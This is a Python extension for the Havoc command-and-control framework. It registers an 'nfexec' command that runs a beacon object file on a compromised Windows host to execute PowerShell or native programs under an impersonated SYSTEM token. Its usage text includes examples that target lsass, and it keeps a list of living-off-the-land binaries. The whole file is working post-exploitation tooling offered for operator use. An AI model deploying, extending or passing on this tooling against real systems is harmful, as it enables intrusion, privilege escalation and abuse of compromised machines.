# nfexec.py — NFEXEC Havoc C2 handler
#
# Execute commands in current thread's security context.
# Use after 'nofilter' for SYSTEM.
#
# Modes:
#   Auto-detect (default): Native exe -> exec mode, PS cmdlet -> PS mode
#   -ps   <command>        Force PowerShell mode (CLR inline)
#   -exec <path> [args]    Force executable mode (CreateProcessWithTokenW)
#
# Why two modes?
#   PS mode runs commands IN-PROCESS on an impersonated CLR thread.
#   PS cmdlets (Get-Process, dir, etc.) work correctly as SYSTEM.
#   But native exe commands (whoami, ipconfig) SPAWN CHILD PROCESSES.
#   Child processes inherit the PROCESS primary token (User), NOT the
#   thread impersonation token (SYSTEM). This is Windows CreateProcess
#   design, not a bug. Exec mode uses CreateProcessWithTokenW to launch
#   the child with a properly duplicated SYSTEM primary token.

import os
from havoc import Demon, RegisterCommand

# ================================================================
# Configuration — edit BOF_DIR to your installation path
# ================================================================

BOF_DIR = "/usr/share/havoc/data/extensions/NOFILTER-NFEXEC/bin"

# ================================================================
# Native command auto-detection
#
# Comprehensive list of Windows System32 native executables.
# Sources: Microsoft A-Z Command Reference, HackTricks, SS64.
# When typed as the first token, these spawn a child process
# and must use exec mode (CreateProcessWithTokenW) to inherit
# the SYSTEM primary token.
#
# PS aliases (dir→Get-ChildItem, type→Get-Content, etc.) are
# NOT in this list because PowerShell handles them in-process.
# ================================================================

_NATIVE_CMDS = frozenset({
    # --- Network ---
    "arp", "finger", "ftp", "getmac", "ipconfig", "nbtstat",
    "net", "net1", "netsh", "netstat", "nltest", "nslookup",
    "pathping", "ping", "route", "tftp", "tracert", "w32tm",
    # --- System info ---
    "driverquery", "hostname", "systeminfo", "whoami",
    # --- Process / task ---
    "taskkill", "tasklist",
    # --- User / session ---
    "logoff", "msg", "qprocess", "query", "quser", "qwinsta", "runas",
    # --- File operations ---
    "attrib", "cacls", "cipher", "clip", "comp", "expand", "fc",
    "find", "findstr", "forfiles", "icacls", "more", "print",
    "robocopy", "sort", "takeown", "tree", "xcopy",
    # --- Disk / volume ---
    "chkdsk", "cleanmgr", "defrag", "diskpart", "format",
    "fsutil", "label", "mountvol", "vssadmin",
    # --- Registry / config ---
    "bcdedit", "reg", "sc", "schtasks",
    # --- Security / crypto ---
    "certutil", "cmdkey", "klist", "manage-bde", "setspn",
    # --- Active Directory / domain ---
    "csvde", "dcdiag", "dnscmd", "dsget", "dsmod", "dsquery",
    "gpresult", "gpupdate", "ldifde", "repadmin",
    # --- Audit / event log ---
    "auditpol", "wevtutil",
    # --- System maintenance ---
    "dism", "sfc", "shutdown", "wbadmin",
    # --- Execution / LOLBins ---
    "bitsadmin", "cmd", "cscript", "mshta", "msiexec",
    "powershell", "regsvr32", "rundll32", "wmic", "wscript",
    # --- Performance / monitoring ---
    "logman", "openfiles", "typeperf",
    # --- Misc ---
    "choice", "timeout", "waitfor", "where",
})


def _is_native(first_token):
    """Determine if the first token of a command is a native executable."""
    s = first_token.lower()
    # Explicit path (C:\... or \\... or ./...) -> native
    if "\\" in first_token or "/" in first_token:
        return True
    # Ends in .exe -> native
    if s.endswith(".exe"):
        return True
    # Known native command
    if s in _NATIVE_CMDS:
        return True
    return False


def _resolve_native_cmdline(params):
    """Build command line for exec mode from auto-detected native command."""
    first = params[0]
    # Append .exe if no extension and no path
    if "\\" not in first and "/" not in first and "." not in first:
        first = first + ".exe"
    parts = [first] + list(params[1:])
    return " ".join(parts)


# ================================================================
# Command handler
# ================================================================

def _nfexec_cb(demonID, *params):
    """Handler for the 'nfexec' command."""

    demon = Demon(demonID)

    bof_path = BOF_DIR + "/nfexec.x64.o"
    if not os.path.isfile(bof_path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] BOF not found: " + bof_path)
        return

    # --- Echo helper: sends text through BOF mode=2 → BeaconOutput (preserves newlines) ---
    def _echo(text):
        p = Packer()
        p.addint(2)        # mode 2 = echo
        p.addstr(text)
        tid = demon.ConsoleWrite(demon.CONSOLE_TASK, "Info")
        demon.InlineExecute(tid, "go", bof_path, p.getbuffer(), False)
        return tid

    if len(params) == 0:
        return _echo(
            "Usage:\n"
            "  nfexec <command>                  Auto-detect mode\n"
            "  nfexec -ps <ps command>           Force PowerShell mode\n"
            "  nfexec -exec <path> [args...]     Force executable mode\n"
            "\n"
            "Auto-detect routes native exe (whoami, ipconfig, net, ...)\n"
            "through exec mode, and PS cmdlets through PS mode.\n"
            "\n"
            "Examples:\n"
            "  nfexec whoami                     (auto -> exec)\n"
            "  nfexec whoami /priv               (auto -> exec)\n"
            "  nfexec Get-Process lsass          (auto -> PS)\n"
            "  nfexec dir C:\\Windows             (auto -> PS)\n"
            "  nfexec -exec C:\\tools\\tool.exe    (force exec)\n"
            "  nfexec -ps [Environment]::UserName (force PS)\n"
        )

    if params[0] in ("-h", "--help"):
        return _echo(
            "Execute in thread token context\n"
            "\n"
            "  After 'nofilter' establishes impersonation,\n"
            "  nfexec runs commands/programs in that context.\n"
            "\n"
            "Modes:\n"
            "  Auto (default): Native exe -> exec, PS cmdlet -> PS\n"
            "  -ps <cmd>:      Force PS (CLR inline)\n"
            "  -exec <path>:   Force exec\n"
            "\n"
            "Why two modes?\n"
            "  PS cmdlets run in-process on impersonated CLR thread.\n"
            "  Native exe spawn child processes which inherit the\n"
            "  process token, not the impersonation token.\n"
            "  Exec mode creates the child with the correct token.\n"
            "\n"
            "PS Examples:\n"
            "  nfexec Get-Process lsass\n"
            "  nfexec dir C:\\Secret\n"
            "  nfexec -ps [Security.Principal.WindowsIdentity]::GetCurrent().Name\n"
            "\n"
            "Exec Examples:\n"
            "  nfexec whoami\n"
            "  nfexec whoami /priv\n"
            "  nfexec ipconfig /all\n"
            "  nfexec -exec C:\\tools\\runner.exe --arg value\n"
        )

    packer = Packer()

    # --- Explicit -exec mode ---
    if params[0] == "-exec":
        if len(params) < 2:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "[!] -exec requires a path. Usage: nfexec -exec <path> [args...]")
            return
        cmdline = " ".join(params[1:])
        packer.addint(1)
        packer.addstr(cmdline)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            "Tasked demon to exec: " + cmdline[:80])

    # --- Explicit -ps mode ---
    elif params[0] == "-ps":
        if len(params) < 2:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "[!] -ps requires a command. Usage: nfexec -ps <command>")
            return
        command = " ".join(params[1:])
        packer.addint(0)
        packer.addstr(command)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            "Tasked demon to PS: " + command[:80])

    # --- Auto-detect: native exe -> exec mode ---
    elif _is_native(params[0]):
        cmdline = _resolve_native_cmdline(params)
        packer.addint(1)
        packer.addstr(cmdline)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            "Tasked demon to exec (auto): " + cmdline[:80])

    # --- Auto-detect: PS cmdlet/expression -> PS mode ---
    else:
        command = " ".join(params)
        packer.addint(0)
        packer.addstr(command)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            "Tasked demon to PS: " + command[:80])

    demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)
    return TaskID


# ================================================================
# Register command — 7 args, 5th is int (Havoc convention)
# ================================================================

RegisterCommand(
    _nfexec_cb,
    "",
    "nfexec",
    "Execute PS/exe in thread token context (use after nofilter for SYSTEM)",
    0,
    "nfexec <cmd> | nfexec -ps <ps> | nfexec -exec <path>",
    "nfexec whoami\nnfexec Get-Process lsass\nnfexec -exec C:\\Windows\\System32\\whoami.exe"
)
